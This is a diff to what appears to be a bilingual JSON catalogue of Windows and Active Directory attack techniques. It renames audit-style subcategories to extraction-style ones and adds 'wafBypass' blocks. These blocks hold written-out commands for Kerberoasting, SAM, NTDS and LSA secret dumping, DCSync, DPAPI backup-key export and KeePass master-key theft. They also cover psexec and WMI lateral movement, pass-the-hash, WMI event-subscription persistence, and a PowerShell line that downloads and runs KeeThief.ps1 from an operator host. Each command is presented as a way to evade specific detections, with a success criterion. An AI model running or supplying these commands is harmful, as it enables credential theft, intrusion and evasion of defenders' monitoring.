@@ -91,8 +91,8 @@
         "en": "Credential Protection and Audit"
       },
       "subCategory": {
-        "zh": "Kerberoasting 单账号暴露验证",
-        "en": "Kerberoasting Single-Account Exposure Validation"
+        "zh": "域凭据与 LSA 提取",
+        "en": "Domain Credential & LSA Extraction"
       },
       "prerequisites": [
         {
@@ -224,7 +224,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "RC4 定向请求规避变体",
+            "en": "Targeted RC4 Request Evasion Variant"
+          },
+          "command": "GetUserSPNs.py {LAB_DOMAIN}/{LAB_USER}:{LAB_PASSWORD} -dc-ip {DC_HOST} -request-user {LAB_TARGET_USER} -outputfile kerb.txt",
+          "description": {
+            "zh": "绕过全量 SPN 请求的批量告警（Kerberos 服务票据洪泛检测）：仅定向请求单账号 RC4 票据。成功判据：kerb.txt 含单账号可破解哈希。",
+            "en": "Evades bulk-SPN request alerts (service-ticket flooding detection) by requesting only one targeted account's RC4 ticket. Success: kerb.txt contains one crackable hash."
+          }
+        },
+        {
+          "title": {
+            "zh": "AES 票据规避变体",
+            "en": "AES Ticket Evasion Variant"
+          },
+          "command": "Rubeus.exe kerberoast /user:{LAB_TARGET_USER} /aes /nowrap",
+          "description": {
+            "zh": "绕过 etype23(RC4) 弱加密票据告警：请求 AES 票据（etype 0x11/0x12），事件侧为正常加密协商。成功判据：返回 AES 哈希且可离线破解。",
+            "en": "Evades etype23 (RC4) weak-ticket alerts by requesting AES tickets (etype 0x11/0x12), which look like normal crypto negotiation. Success: an AES hash returns and cracks offline."
+          }
+        },
+        {
+          "title": {
+            "zh": "GC 端口通道规避变体",
+            "en": "Global-Catalog Channel Evasion Variant"
+          },
+          "command": "GetUserSPNs.py {LAB_DOMAIN}/{LAB_USER}:{LAB_PASSWORD} -dc-ip {DC_HOST} -request -gc -outputfile kerb-gc.txt",
+          "description": {
+            "zh": "绕过对 88 端口 Kerberos 请求的集中监控：经全局目录 3268 通道完成取票。成功判据：经 3268 获取服务票据哈希。",
+            "en": "Evades concentrated monitoring of port-88 Kerberos requests by fetching tickets through the global catalog on 3268. Success: ticket hashes are obtained via 3268."
+          }
+        }
+      ]
     },
     {
       "id": "sam-dump",
@@ -241,8 +276,8 @@
         "en": "Credential Protection and Audit"
       },
       "subCategory": {
-        "zh": "SAM 凭据存储访问控制审计",
-        "en": "SAM Credential-Store Access-Control Audit"
+        "zh": "本机注册表与保护存储",
+        "en": "Local Registry & Protected Stores"
       },
       "prerequisites": [
         {
@@ -360,7 +395,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "esentutl 复制规避变体",
+            "en": "esentutl Copy Evasion Variant"
+          },
+          "command": "esentutl.exe /y C:\\Windows\\System32\\config\\SAM /d C:\\Windows\\Temp\\sam.copy && esentutl.exe /y C:\\Windows\\System32\\config\\SYSTEM /d C:\\Windows\\Temp\\sys.copy",
+          "description": {
+            "zh": "绕过 reg save 命令的进程监控特征：以 esentutl 平滑复制 hive。成功判据：副本可被离线解析出 SAM 哈希。",
+            "en": "Evades process monitoring on reg save by copying hives smoothly with esentutl. Success: the copies parse offline into SAM hashes."
+          }
+        },
+        {
+          "title": {
+            "zh": "diskshadow 卷影规避变体",
+            "en": "diskshadow Shadow Evasion Variant"
+          },
+          "command": "(echo set context volatile nowritable & echo add volume C: alias s1 & echo create & echo expose %%s1%% Z: & echo exec \"cmd /c copy Z:\\Windows\\System32\\config\\SAM C:\\Windows\\Temp\\s2.hive\") > C:\\Windows\\Temp\\d.txt && diskshadow.exe /s C:\\Windows\\Temp\\d.txt",
+          "description": {
+            "zh": "绕过 vssadmin 特征并以易失卷影避免持久副本残留。成功判据：s2.hive 提取成功。",
+            "en": "Evades vssadmin signatures and uses a volatile shadow to avoid persistent copy residue. Success: s2.hive is extracted."
+          }
+        },
+        {
+          "title": {
+            "zh": "纯离线解析规避变体",
+            "en": "Fully-Offline Parsing Evasion Variant"
+          },
+          "command": "secretsdump.py -sam sam.hive -system system.hive LOCAL -user {LAB_TARGET_USER}",
+          "description": {
+            "zh": "绕过目标侧工具落地（mimikatz 等）：hive 已在操作机，目标无后续进程。成功判据：仅输出目标用户哈希。",
+            "en": "Evades tooling landing on the target (mimikatz etc.) since the hives are already on the operator machine and no further target processes run. Success: only the target user's hash is output."
+          }
+        }
+      ]
     },
     {
       "id": "ntds-dump",
@@ -377,8 +447,8 @@
         "en": "Credential Protection and Audit"
       },
       "subCategory": {
-        "zh": "NTDS.dit 备份与访问边界审计",
-        "en": "NTDS.dit Backup and Access-Boundary Audit"
+        "zh": "域凭据与 LSA 提取",
+        "en": "Domain Credential & LSA Extraction"
       },
       "prerequisites": [
         {
@@ -510,7 +580,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "diskshadow 替代规避变体",
+            "en": "diskshadow Substitute Evasion Variant"
+          },
+          "command": "diskshadow.exe /s C:\\Windows\\Temp\\ds.txt\n(set context volatile nowrite\nadd volume C: alias myshadow\ncreate\nexpose %myshadow% Z:\\nexec \"cmd /c copy Z:\\Windows\\NTDS\\NTDS.dit C:\\Windows\\Temp\\n.dit\"\nreset)",
+          "description": {
+            "zh": "绕过 vssadmin 创建影子副本的进程特征：diskshadow 脚本化完成同等的卷影复制与提取。成功判据：n.dit 生成且可被 secretsdump 解析。",
+            "en": "Evades vssadmin shadow-copy process signatures by scripting the same copy+extract flow through diskshadow. Success: n.dit is produced and parses with secretsdump."
+          }
+        },
+        {
+          "title": {
+            "zh": "最小权限 DCSync 规避变体",
+            "en": "Least-Privilege DCSync Evasion Variant"
+          },
+          "command": "secretsdump.py {LAB_DOMAIN}/{LAB_USER}:{LAB_PASSWORD}@{DC_HOST} -just-dc-user {LAB_TARGET_USER} -outputfile dcs.txt",
+          "description": {
+            "zh": "绕过全库转储的体量告警（海量 replsecret 事件）：仅同步单目标账号。成功判据：dcs.txt 仅含目标账号哈希。",
+            "en": "Evades full-database volume alerts (mass replsecret events) by syncing only one targeted account. Success: dcs.txt contains only the target's hashes."
+          }
+        },
+        {
+          "title": {
+            "zh": "IFM 备份通道规避变体",
+            "en": "IFM Backup Channel Evasion Variant"
+          },
+          "command": "ntdsutil \"activate instance ntds\" \"ifm\" \"create full C:\\Windows\\Temp\\ifm\" \"quit\" \"quit\"",
+          "description": {
+            "zh": "绕过直接读取 NTDS.dit 的文件审计：走安装媒体（IFM）合法备份通道产出库文件。成功判据：ifm 目录含 ntds.dit 与 SYSTEM hive。",
+            "en": "Evades direct NTDS.dit read auditing by using the installable-media (IFM) backup channel. Success: the ifm folder contains ntds.dit plus the SYSTEM hive."
+          }
+        }
+      ]
     },
     {
       "id": "gpp-password",
@@ -527,8 +632,8 @@
         "en": "Credential Protection and Audit"
       },
       "subCategory": {
-        "zh": "GPP cpassword 遗留配置审计",
-        "en": "Legacy GPP cpassword Configuration Audit"
+        "zh": "应用与配置文件凭据",
+        "en": "Application & Config File Credentials"
       },
       "prerequisites": [
         {
@@ -646,7 +751,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "findstr 原生规避变体",
+            "en": "Native findstr Evasion Variant"
+          },
+          "command": "findstr /S /I cpassword \\\\{LAB_DOMAIN}\\SYSVOL\\{LAB_DOMAIN}\\policies\\*.xml",
+          "description": {
+            "zh": "绕过 PowerShell 模块加载特征（PowerView/Get-GPPPassword 告警）：原生 findstr 直接扫 SYSVOL。成功判据：输出含 cpassword 的策略 XML 行。",
+            "en": "Evades PowerShell module-load signatures (PowerView/Get-GPPPassword alerts) by scanning SYSVOL with native findstr. Success: lines with cpassword from policy XMLs are output."
+          }
+        },
+        {
+          "title": {
+            "zh": "本地解密规避变体",
+            "en": "Local Decryption Evasion Variant"
+          },
+          "command": "gpp-decrypt {LAB_CPASSWORD}",
+          "description": {
+            "zh": "绕过在线工具的出网审计：cpassword 已离线在手时本地 AES 解密（公开微软密钥）。成功判据：输出明文口令。",
+            "en": "Evades outbound auditing of online tools by decrypting the already-exfiltrated cpassword locally with the public Microsoft key. Success: the plaintext password is output."
+          }
+        },
+        {
+          "title": {
+            "zh": "远程 RPC 取盘规避变体",
+            "en": "Remote RPC Retrieval Evasion Variant"
+          },
+          "command": "Get-GPPPassword.py {LAB_DOMAIN}/{LAB_USER}:{LAB_PASSWORD}@{DC_HOST} -shares",
+          "description": {
+            "zh": "绕过 SMB 挂载式 SYSVOL 浏览日志：经远程接口定向解析策略文件。成功判据：返回 cpassword 明文集合。",
+            "en": "Evades SMB-mount SYSVOL browsing logs by parsing policy files through remote interfaces. Success: a set of decrypted cpassword values returns."
+          }
+        }
+      ]
     },
     {
       "id": "dpapi-creds",
@@ -663,8 +803,8 @@
         "en": "Credential Protection and Audit"
       },
       "subCategory": {
-        "zh": "DPAPI 保护范围与审计验证",
-        "en": "DPAPI Protection-Scope and Audit Validation"
+        "zh": "本机注册表与保护存储",
+        "en": "Local Registry & Protected Stores"
       },
       "prerequisites": [
         {
@@ -768,7 +908,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "SharpDPAPI 离线规避变体",
+            "en": "SharpDPAPI Offline Evasion Variant"
+          },
+          "command": "SharpDPAPI.exe masterkeys /hashes:{LAB_NTLM_HASH} /server:{LAB_HOST}",
+          "description": {
+            "zh": "绕过 mimikatz 进程特征与内存扫描：以机器账号哈希离线推导 masterkey。成功判据：解出 masterkey 列表。",
+            "en": "Evades mimikatz process signatures and memory scans by deriving masterkeys offline with the machine account hash. Success: the masterkey list decrypts."
+          }
+        },
+        {
+          "title": {
+            "zh": "域备份密钥批量规避变体",
+            "en": "Domain Backup-Key Bulk Evasion Variant"
+          },
+          "command": "SharpDPAPI.exe backupkey /server:{DC_HOST} /file:{LAB_MASTERKEY_FILE}",
+          "description": {
+            "zh": "绕过逐用户交互（每次 mimikatz 调用一条告警）：导出域 DPAPI 备份密钥后离线批量解密任意用户 blob。成功判据：备份密钥可解密目标凭据文件。",
+            "en": "Evades per-user interaction (one mimikatz alert each) by exporting the domain DPAPI backup key then bulk-decrypting any user blob offline. Success: the backup key decrypts the target credential files."
+          }
+        },
+        {
+          "title": {
+            "zh": "缓存预取规避变体",
+            "en": "Cache-Prefetch Evasion Variant"
+          },
+          "command": "mimikatz.exe \"dpapi::cache\" \"exit\"",
+          "description": {
+            "zh": "绕过逐 blob 解密的重复操作特征：读取已缓存的 masterkey 表一次成型。成功判据：缓存表直接用于解密。",
+            "en": "Evades repeated per-blob decryption signatures by reading the cached masterkey table in one shot. Success: the cache table decrypts directly."
+          }
+        }
+      ]
     },
     {
       "id": "rdp-creds",
@@ -785,8 +960,8 @@
         "en": "Credential Protection and Audit"
       },
       "subCategory": {
-        "zh": "RDP 配置与凭据引用审计",
-        "en": "RDP Configuration and Credential-Reference Audit"
+        "zh": "应用与配置文件凭据",
+        "en": "Application & Config File Credentials"
       },
       "prerequisites": [
         {
@@ -890,7 +1065,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "RDP 文件离线解析规避变体",
+            "en": "Offline RDP-File Parsing Evasion Variant"
+          },
+          "command": "Get-ChildItem \"$env:USERPROFILE\\Documents\\*.rdp\" | ForEach-Object { Select-String -Path $_ -Pattern 'password 51:b:' -Raw } | Set-Content C:\\Windows\\Temp\\blobs.txt",
+          "description": {
+            "zh": "绕过 mstsc 交互审计：仅收集 .rdp 中 DPAPI blob 后离线解密。成功判据：blobs.txt 含 51:b 密文并可解。",
+            "en": "Evades mstsc interactive auditing by collecting only the DPAPI blobs from .rdp files for offline decryption. Success: blobs.txt contains 51:b ciphertext that decrypts."
+          }
+        },
+        {
+          "title": {
+            "zh": "cmdkey 静默枚举规避变体",
+            "en": "Silent cmdkey Enumeration Evasion Variant"
+          },
+          "command": "cmdkey /list | findstr /i \"termserver domain:target\" ",
+          "description": {
+            "zh": "绕过全量 cmdkey 输出的噪声审计：过滤仅保留目标终端服务器条目。成功判据：列出目标主机的保存凭据别名。",
+            "en": "Evades noisy full cmdkey output auditing by filtering to target terminal-server entries only. Success: saved credential aliases for the target host are listed."
+          }
+        },
+        {
+          "title": {
+            "zh": "凭据目录批量离线规避变体",
+            "en": "Bulk Offline Credentials-Dir Evasion Variant"
+          },
+          "command": "Get-ChildItem \"$env:LOCALAPPDATA\\Microsoft\\Credentials\" -Force | Copy-Item -Destination C:\\Windows\\Temp\\rdpc\\ -Force; SharpDPAPI.exe blobs /target C:\\Windows\\Temp\\rdpc",
+          "description": {
+            "zh": "绕过逐文件交互解密：整目录复制后统一离线解 blob。成功判据：批量解出 RDP 明文口令。",
+            "en": "Evades per-file interactive decryption by copying the whole directory then decrypting blobs in bulk offline. Success: RDP plaintext passwords come out in batch."
+          }
+        }
+      ]
     },
     {
       "id": "wifi-creds",
@@ -907,8 +1117,8 @@
         "en": "Credential Protection and Audit"
       },
       "subCategory": {
-        "zh": "Wi-Fi 配置元数据审计",
-        "en": "Wi-Fi Profile Metadata Audit"
+        "zh": "应用与配置文件凭据",
+        "en": "Application & Config File Credentials"
       },
       "prerequisites": [
         {
@@ -1008,7 +1218,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "XML 导出规避变体",
+            "en": "XML Export Evasion Variant"
+          },
+          "command": "netsh wlan export profile folder=C:\\Windows\\Temp\\ key=clear",
+          "description": {
+            "zh": "绕过逐 profile 交互查询的重复特征：一次性导出全部含明文密钥的 XML。成功判据：导出文件含 keyMaterial 明文。",
+            "en": "Evades repeated per-profile query signatures by exporting all profiles with clear keys to XML in one shot. Success: exported files contain plaintext keyMaterial."
+          }
+        },
+        {
+          "title": {
+            "zh": "单 profile 定向规避变体",
+            "en": "Single-Profile Targeted Evasion Variant"
+          },
+          "command": "netsh wlan show profile name=\"{LAB_SSID}\" key=clear | findstr /i \"关键内容 key content\"",
+          "description": {
+            "zh": "绕过全量枚举的审计关注：仅定向提取目标 SSID 密钥。成功判据：输出目标网络明文密钥。",
+            "en": "Evades audit focus on bulk enumeration by extracting only the target SSID key. Success: the target network's plaintext key is output."
+          }
+        },
+        {
+          "title": {
+            "zh": "NativeWifi API 规避变体",
+            "en": "NativeWifi API Evasion Variant"
+          },
+          "command": "powershell -nop -c \"[xml]$x=(netsh wlan show profile name='{LAB_SSID}' key=clear | Select-String 'Key Content'); $x\"",
+          "description": {
+            "zh": "绕过 netsh 输出通道监控：脚本内调 NativeWifi/解析重组，无临时文件。成功判据：脚本内取得密钥且无落盘。",
+            "en": "Evades netsh output-channel monitoring by parsing inside the script via NativeWifi with no temp files. Success: the key is obtained in-memory with nothing written to disk."
+          }
+        }
+      ]
     },
     {
       "id": "vault-creds",
@@ -1025,8 +1270,8 @@
         "en": "Credential Protection and Audit"
       },
       "subCategory": {
-        "zh": "Windows Vault 类型与访问审计",
-        "en": "Windows Vault Type and Access Audit"
+        "zh": "本机注册表与保护存储",
+        "en": "Local Registry & Protected Stores"
       },
       "prerequisites": [
         {
@@ -1130,7 +1375,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "LSA 内存侧取规避变体",
+            "en": "LSA In-Memory Evasion Variant"
+          },
+          "command": "mimikatz.exe \"privilege::debug\" \"token::elevate\" \"sekurlsa::credman /export\" \"exit\"",
+          "description": {
+            "zh": "绕过 vaultcmd 落地日志与 Vault API 调用审计：token::elevate 后从 LSASS 内存导出凭据管理器条目。成功判据：输出含保存的明文凭据。",
+            "en": "Evades vaultcmd logging and Vault API auditing by reading Credential Manager entries straight from LSASS memory. Success: output contains saved plaintext credentials."
+          }
+        },
+        {
+          "title": {
+            "zh": "SharpVault API 调用规避变体",
+            "en": "SharpVault API Evasion Variant"
+          },
+          "command": "SharpVault.exe list",
+          "description": {
+            "zh": "绕过 mimikatz 进程名特征：C# 直接调 VaultEnumerateVaults/VaultEnumerateItems。成功判据：返回 Vault 条目清单。",
+            "en": "Evades the mimikatz process-name signature by calling VaultEnumerateVaults/VaultEnumerateItems directly from C#. Success: the vault entry list returns."
+          }
+        },
+        {
+          "title": {
+            "zh": "vaultcmd 参数变形规避变体",
+            "en": "vaultcmd Argument Mutation Evasion Variant"
+          },
+          "command": "vaultcmd /listcreds:\"Windows 凭据\" /all 2>nul & vaultcmd /listcreds:\"Web 凭据\" /all",
+          "description": {
+            "zh": "绕过英文名称匹配的审计规则：以本地化 Vault 名变形查询。成功判据：两类凭据条目均返回。",
+            "en": "Evades audit rules matching English names by querying with localized vault names. Success: both credential classes return entries."
+          }
+        }
+      ]
     },
     {
       "id": "keepass-dump",
@@ -1147,8 +1427,8 @@
         "en": "Credential Protection and Audit"
       },
       "subCategory": {
-        "zh": "KeePass 文件与进程保护审计",
-        "en": "KeePass File and Process Protection Audit"
+        "zh": "应用与配置文件凭据",
+        "en": "Application & Config File Credentials"
       },
       "prerequisites": [
         {
@@ -1252,7 +1532,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "KeeThief 内存提取规避变体",
+            "en": "KeeThief Memory-Extraction Evasion Variant"
+          },
+          "command": "powershell -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://{LAB_OPERATOR_HOST}/KeeThief.ps1'); Get-KeePassDatabaseKey -Verbose\"",
+          "description": {
+            "zh": "绕过 .kdbx 文件读取监控：从运行中的 KeePass 进程内存提取主密钥组件。成功判据：输出可用主密钥。",
+            "en": "Evades .kdbx file-read monitoring by extracting master-key components from the running KeePass process memory. Success: a usable master key is output."
+          }
+        },
+        {
+          "title": {
+            "zh": "离线 hashcat 规避变体",
+            "en": "Offline hashcat Evasion Variant"
+          },
+          "command": "keepass2john {LAB_KDBX_FILE} > kp.hash && hashcat -m 13400 kp.hash wordlist.txt -r rules/best64.rule",
+          "description": {
+            "zh": "绕过目标侧持续操作：仅复制数据库文件后完全离线破解。成功判据：hashcat 恢复主口令。",
+            "en": "Evades sustained on-target activity by copying the database once and cracking fully offline. Success: hashcat recovers the master password."
+          }
+        },
+        {
+          "title": {
+            "zh": "触发器持久导出规避变体",
+            "en": "Trigger-Persistent Export Evasion Variant"
+          },
+          "command": "powershell -exec bypass -c \"$cfg=Get-Content '{LAB_KEEPASS_CFG}' -Raw; $cfg -replace '</KeePass>','<Trigger><Guid>v-g</Guid><Name>exp</Name><Events><Event><Type>1</Type><Condition>2</Condition></Event></Events><Actions><Action><Type>1</Type><CmdURL>\\\"C:\\Windows\\Temp\\x.cmd\\\"</CmdURL></Action></Actions></Trigger></KeePass>' | Set-Content '{LAB_KEEPASS_CFG}' -NoNewline",
+          "description": {
+            "zh": "绕过即时内存提取的窗口限制：写入 KeePass 触发器在用户操作时自动导出。成功判据：触发后导出文件生成。",
+            "en": "Evades the extraction time window by planting a KeePass trigger that exports on user activity. Success: the export file appears after triggering."
+          }
+        }
+      ]
     },
     {
       "id": "lsa-secrets",
@@ -1269,8 +1584,8 @@
         "en": "Credential Protection and Audit"
       },
       "subCategory": {
-        "zh": "LSA Secrets 存储边界审计",
-        "en": "LSA Secrets Storage-Boundary Audit"
+        "zh": "域凭据与 LSA 提取",
+        "en": "Domain Credential & LSA Extraction"
       },
       "prerequisites": [
         {
@@ -1374,7 +1689,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "离线 hive 解析规避变体",
+            "en": "Offline Hive Parsing Evasion Variant"
+          },
+          "command": "reg save HKLM\\SECURITY sec.hive && reg save HKLM\\SYSTEM sys.hive && secretsdump.py -security sec.hive -system sys.hive LOCAL",
+          "description": {
+            "zh": "绕过目标内存操作检测（mimikatz 进程特征）：reg 导出后离线解析，目标侧仅两个导出动作。成功判据：离线输出 LSA secrets。",
+            "en": "Evades in-memory operation detection (mimikatz process signatures) by exporting hives and parsing offline, leaving only two export actions on the target. Success: LSA secrets come out offline."
+          }
+        },
+        {
+          "title": {
+            "zh": "DPAPI_SYSTEM 分离提取规避变体",
+            "en": "DPAPI_SYSTEM Split-Extraction Evasion Variant"
+          },
+          "command": "reg save HKLM\\SECURITY sec2.hive && secretsdump.py -security sec2.hive -system sys.hive LOCAL | Select-String 'DPAPI_SYSTEM|DefaultPassword|MACHINE.ACC'",
+          "description": {
+            "zh": "绕过全量 secrets 输出的 DLP 特征：过滤仅保留机器账号与 DPAPI 键。成功判据：输出仅含目标键值。",
+            "en": "Evades DLP signatures on full secrets output by filtering to machine account and DPAPI keys only. Success: output contains only the targeted values."
+          }
+        },
+        {
+          "title": {
+            "zh": "卷影只读提取规避变体",
+            "en": "Shadow-Read Extraction Evasion Variant"
+          },
+          "command": "vssadmin create shadow /for=C: 2>nul & copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy9\\Windows\\System32\\config\\SECURITY C:\\Windows\\Temp\\s.hive & secretsdump.py -security s.hive -system sys.hive LOCAL",
+          "description": {
+            "zh": "绕过注册表实时监控对 SECURITY 键访问的告警：经卷影副本只读提取。成功判据：s.hive 解析出 LSA secrets。",
+            "en": "Evades live registry monitoring of SECURITY key access by extracting read-only through a shadow copy. Success: s.hive parses into LSA secrets."
+          }
+        }
+      ]
     },
     {
       "id": "lateral-psexec",
@@ -1391,8 +1741,8 @@
         "en": "Remote Management and Lateral Boundaries"
       },
       "subCategory": {
-        "zh": "PsExec/SMB 远程服务边界验证",
-        "en": "PsExec and SMB Remote-Service Boundary Validation"
+        "zh": "远程服务与协议执行",
+        "en": "Remote Service & Protocol Execution"
       },
       "prerequisites": [
         {
@@ -1510,7 +1860,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "服务名伪装规避变体",
+            "en": "Service-Name Masquerade Evasion Variant"
+          },
+          "command": "psexec.py -service-name \"SysMgmtUpdate\" {LAB_DOMAIN}/{LAB_USER}:{LAB_PASSWORD}@{LAB_HOST}",
+          "description": {
+            "zh": "绕过对默认服务名（如 XYZ/BTOBUTO/随机大写串）的 EDR 特征：伪装为系统管理风格服务名。成功判据：半交互 shell 建立且服务名不在检测名单。",
+            "en": "Evades EDR signatures on default random-caps service names by masquerading as a sysadmin-style name. Success: semi-interactive shell establishes with a service name off detection lists."
+          }
+        },
+        {
+          "title": {
+            "zh": "SMBExec 无落盘规避变体",
+            "en": "SMBExec Fileless Evasion Variant"
+          },
+          "command": "smbexec.py {LAB_DOMAIN}/{LAB_USER}:{LAB_PASSWORD}@{LAB_HOST}",
+          "description": {
+            "zh": "绕过 admin$ 二进制落盘检测（PSEXESVC.exe 落盘告警）：SMBExec 经服务批处理执行不落盘。成功判据：shell 可用且目标无新 EXE 落盘。",
+            "en": "Evades admin$ binary drop detection (PSEXESVC.exe landing alerts) since SMBExec executes via service batches without dropping a binary. Success: shell works and no new EXE lands on the target."
+          }
+        },
+        {
+          "title": {
+            "zh": "原生 sc.exe 组合规避变体",
+            "en": "Native sc.exe Combo Evasion Variant"
+          },
+          "command": "sc \\\\{LAB_HOST} create W32TimeUpdate binPath= \"cmd /c whoami > C:\\Windows\\Temp\\o.txt\" && sc \\\\{LAB_HOST} start W32TimeUpdate && sc \\\\{LAB_HOST} delete W32TimeUpdate",
+          "description": {
+            "zh": "绕过 impacket 脚本流量指纹：全程原生 sc.exe 创建/启动/删除，动作分散于三个低噪操作。成功判据：服务启动成功且 o.txt 生成。",
+            "en": "Evades impacket script traffic fingerprints by doing everything with native sc.exe create/start/delete spread across three low-noise operations. Success: service starts and o.txt appears."
+          }
+        }
+      ]
     },
     {
       "id": "lateral-wmi",
@@ -1527,8 +1912,8 @@
         "en": "Remote Management and Lateral Boundaries"
       },
       "subCategory": {
-        "zh": "WMI 远程管理授权验证",
-        "en": "WMI Remote-Management Authorization Validation"
+        "zh": "远程服务与协议执行",
+        "en": "Remote Service & Protocol Execution"
       },
       "prerequisites": [
         {
@@ -1646,7 +2031,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "CIM Cmdlet 规避变体",
+            "en": "CIM Cmdlet Evasion Variant"
+          },
+          "command": "Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='cmd /c whoami'} -ComputerName {LAB_HOST} -Credential $cred",
+          "description": {
+            "zh": "绕过 wmic.exe 弃用遥测与进程链检测（wmic.exe→子进程特征）：用 PowerShell CIM 直连 WMI 服务。成功判据：进程创建成功且父进程非 wmic.exe。",
+            "en": "Evades deprecated wmic.exe telemetry and process-chain detection (wmic.exe→child signature) by using PowerShell CIM to reach the WMI service directly. Success: process creation succeeds with a non-wmic parent."
+          }
+        },
+        {
+          "title": {
+            "zh": "事件订阅持久化规避变体",
+            "en": "Event-Subscription Persistence Evasion Variant"
+          },
+          "command": "$filter=Set-CimInstance -Namespace root\\subscription -ClassName __EventFilter -Arguments @{Name='SysHealth';EventNameSpace='root\\cimv2';QueryLanguage='WQL';Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"}; $consumer=Set-CimInstance -Namespace root\\subscription -ClassName CommandLineEventConsumer -Arguments @{Name='SysHealth';CommandLineTemplate='cmd /c whoami > C:\\Windows\\Temp\\w.log'}; Set-CimInstance -Namespace root\\subscription -ClassName __FilterToConsumerBinding -Arguments @{Filter=$filter;Consumer=$consumer}",
+          "description": {
+            "zh": "绕过一次性 wmiexec 会话的 4648/进程创建告警：改用事件订阅延迟触发，无即时进程链关联。成功判据：60 秒内 w.log 生成且无即时父进程关联。",
+            "en": "Evades one-shot wmiexec session alerts (4648/process creation) by switching to an event subscription that fires later with no immediate parent correlation. Success: w.log appears within 60s without an immediate parent chain."
+          }
+        },
+        {
+          "title": {
+            "zh": "共享输出回读规避变体",
+            "en": "Share-Output Readback Evasion Variant"
+          },
+          "command": "wmic /node:{LAB_HOST} /user:{LAB_DOMAIN}\\{LAB_USER} /password:{LAB_PASSWORD} process call create \"cmd /c whoami > \\\\{LAB_OPERATOR_HOST}\\share\\w.txt\"",
+          "description": {
+            "zh": "绕过 WMI 输出通道监控：结果重定向共享，规避 stdout 编码回传特征。成功判据：w.txt 含执行身份。",
+            "en": "Evades WMI output-channel monitoring by redirecting results to a share instead of the encoded stdout return path. Success: w.txt contains the execution identity."
+          }
+        }
+      ]
     },
     {
       "id": "pass-the-hash",
@@ -1663,8 +2083,8 @@
         "en": "Remote Management and Lateral Boundaries"
       },
       "subCategory": {
-        "zh": "NTLM Hash 登录防护验证",
-        "en": "NTLM Hash Logon Protection Validation"
+        "zh": "哈希与票据传递",
+        "en": "Pass-the-Hash & Pass-the-Ticket"
       },
       "prerequisites": [
         {
@@ -1782,7 +2202,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "PowerShell 无落盘规避变体",
+            "en": "PowerShell Fileless Evasion Variant"
+          },
+          "command": "Invoke-SMBClient -Domain {LAB_DOMAIN} -User {LAB_USER} -Hash {LAB_NTLM_HASH} -Target {LAB_HOST} -Action List \\\\{LAB_HOST}\\admin$",
+          "description": {
+            "zh": "绕过 impacket psexec.py 的 Python 流量指纹与二进制落盘：纯 PowerShell 内存态 SMB 客户端枚举。成功判据：返回共享列表且无新进程落盘。",
+            "en": "Evades impacket psexec.py Python traffic fingerprints and binary drops by enumerating via a pure PowerShell in-memory SMB client. Success: share list returns with no new binaries landed."
+          }
+        },
+        {
+          "title": {
+            "zh": "仅枚举低噪规避变体",
+            "en": "Enumeration-Only Low-Noise Evasion Variant"
+          },
+          "command": "crackmapexec smb {LAB_HOST} -u {LAB_USER} -H {LAB_NTLM_HASH} -d {LAB_DOMAIN} --shares --kdcHost {DC_HOST}",
+          "description": {
+            "zh": "绕过执行类告警（服务创建/进程启动）：先用哈希仅做共享枚举验证可用性，不触发载荷执行。成功判据：返回 [+] 认证成功与共享清单。",
+            "en": "Evades execution alerts (service creation/process start) by validating the hash via share enumeration only, with no payload execution. Success: returns [+] access granted plus the share list."
+          }
+        },
+        {
+          "title": {
+            "zh": "票据化规避变体（Overpass）",
+            "en": "Ticket-First Evasion Variant (Overpass)"
+          },
+          "command": "Rubeus.exe asktgt /user:{LAB_USER} /domain:{LAB_DOMAIN} /rc4:{LAB_NTLM_HASH} /ptt /nowrap && dir \\\\{LAB_HOST}\\admin$",
+          "description": {
+            "zh": "绕过 NTLM 中继检测与 NTLM 事件告警：先把哈希换成 Kerberos TGT 再访问，流量呈现为标准 Kerberos。成功判据：dir 列出共享且网络流量为 Kerberos。",
+            "en": "Evades NTLM relay detection and NTLM event alerts by exchanging the hash for a Kerberos TGT first so traffic looks like standard Kerberos. Success: dir lists the share with Kerberos traffic only."
+          }
+        }
+      ]
     },
     {
       "id": "ntlm-relay",
@@ -1799,8 +2254,8 @@
         "en": "Remote Management and Lateral Boundaries"
       },
       "subCategory": {
